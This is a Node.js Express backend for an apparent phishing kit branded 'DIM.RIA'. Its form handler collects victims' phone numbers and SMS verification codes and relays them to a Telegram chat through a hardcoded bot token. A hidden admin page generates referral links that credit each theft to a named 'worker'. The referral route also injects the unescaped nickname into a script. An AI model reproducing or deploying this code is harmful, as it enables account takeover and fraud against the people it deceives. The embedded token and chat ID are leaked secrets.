const express = require('express');
const bodyParser = require('body-parser');
const path = require('path');
const fetch = require('node-fetch');

const app = express();
const port = process.env.PORT || 3000;

// === КОНФІГУРАЦІЯ TELEGRAM ===
const BOT_TOKEN = "8539302594:AAElRKi_77Mm9tCpOyODY3nLs9Z9BzPlp18";
const CHAT_ID = "-5055127448";
const TELEGRAM_API = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`;
// ==============================

app.use(bodyParser.urlencoded({ extended: true }));
app.use(bodyParser.json());
app.use(express.static(path.join(__dirname, '/')));

// === АДМИН-ПАНЕЛЬ: Генерация скрытой реф-ссылки ===
app.get('/admin', (req, res) => {
    res.send(`
<!DOCTYPE html>
<html lang="uk">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Реф Генератор (Скрытый)</title>
    <style>
        body { font-family: 'Segoe UI', sans-serif; background: #0a0a1a; color: #0ff; padding: 40px; text-align: center; }
        .box { max-width: 520px; margin: 0 auto; background: #1a1a2e; padding: 35px; border-radius: 16px; border: 1px solid #0ff; box-shadow: 0 0 20px rgba(0, 255, 255, 0.2); }
        h1 { margin-bottom: 10px; }
        p { margin: 10px 0 20px; opacity: 0.9; }
        input { width: 100%; padding: 14px; margin: 10px 0; background: #16213e; color: #fff; border: none; border-radius: 8px; font-size: 16px; }
        button { width: 100%; padding: 14px; background: #00ffaa; color: #000; font-weight: bold; border: none; border-radius: 8px; cursor: pointer; transition: 0.3s; }
        button:hover { background: #00cc88; }
        .link { background: #16213e; color: #0f0; padding: 16px; border-radius: 8px; margin-top: 15px; font-family: monospace; word-break: break-all; display: none; }
        .copy { background: #333; color: #0f0; margin-top: 10px; }
    </style>
</head>
<body>
    <div class="box">
        <h1>Скрытый Реф Генератор</h1>
        <p>Введи ник <b>без @</b>:</p>
        <input type="text" id="nick" placeholder="worker123" />
        <button onclick="gen()">Создать ссылку</button>
        <div id="link" class="link"></div>
        <button class="copy" onclick="copyLink()" id="copy" style="display:none">Скопировать</button>
    </div>

    <script>
        function gen() {
            const nick = document.getElementById('nick').value.trim();
            if (!nick) return alert('Введи ник!');

            const base = window.location.origin;
            const shortLink = \`\${base}/r/\${nick}\`;

            const linkEl = document.getElementById('link');
            const copyBtn = document.getElementById('copy');
            linkEl.textContent = shortLink;
            linkEl.style.display = 'block';
            copyBtn.style.display = 'block';
        }

        function copyLink() {
            const text = document.getElementById('link').textContent;
            navigator.clipboard.writeText(text).then(() => {
                alert('Скопировано в буфер!');
            });
        }
    </script>
</body>
</html>
    `);
});

// === РЕФЕРАЛЬНЫЙ МАРШРУТ: /r/nick → сохраняет в localStorage и редиректит ===
app.get('/r/:nick', (req, res) => {
    const nick = req.params.nick.trim();
    if (!nick) return res.redirect('/');

    const cleanNick = nick.startsWith('@') ? nick : '@' + nick;

    res.send(`
    <!DOCTYPE html>
    <html><head><meta charset="utf-8"></head>
    <body>
        <script>
            localStorage.setItem('worker_ref', '${cleanNick}');
            window.location.href = '/';
        </script>
    </body></html>
    `);
});

// === ГЛАВНАЯ СТРАНИЦА ===
app.get('/', (req, res) => {
    res.sendFile(path.join(__dirname, 'index.html')); // Убедись, что index.html существует
});

// === ОБРОБКА ДАННЫХ С ФОРМЫ ===
app.post('/api/send-data', async (req, res) => {
    const { step, phone, code, ref } = req.body;

    // Реферал из тела запроса (приходит с клиента)
    const workerRef = ref && ref.startsWith('@') ? ref : 'Не указан';

    let message = '';

    if (step === 'phone' && phone) {
        message = `*ПРОЕКТ:* DIM.RIA ⚡⚡⚡\n*Номер:* \`${phone}\`\n*СТРАНА:* Украина\n*Работник:* ${workerRef}`;
    } 
    else if (step === 'code' && code) {
        message = `*SMS:*\n\`${code}\`\n*Работник:* ${workerRef}`;
    } 
    else {
        return res.status(400).json({ success: false, message: 'Невірні дані' });
    }

    const success = await sendToTelegram(message);

    if (success) {
        res.json({ success: true });
    } else {
        res.status(500).json({ success: false, message: 'Помилка сервера' });
    }
});

// === ОТПРАВКА В TELEGRAM ===
async function sendToTelegram(message) {
    const params = {
        chat_id: CHAT_ID,
        text: message,
        parse_mode: 'Markdown'
    };

    try {
        const response = await fetch(TELEGRAM_API, {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify(params)
        });

        if (!response.ok) {
            const errorData = await response.json();
            console.error('Помилка Telegram API:', errorData);
            return false;
        }
        return true;
    } catch (error) {
        console.error('Помилка відправки:', error);
        return false;
    }
}

// === ЗАПУСК СЕРВЕРА ===
app.listen(port, () => {
    console.log(`Сервер запущено: http://localhost:${port}`);
    console.log(`Админ-панель: http://localhost:${port}/admin`);
    console.log(`Пример реф-ссылки: http://localhost:${port}/r/worker123`);
});
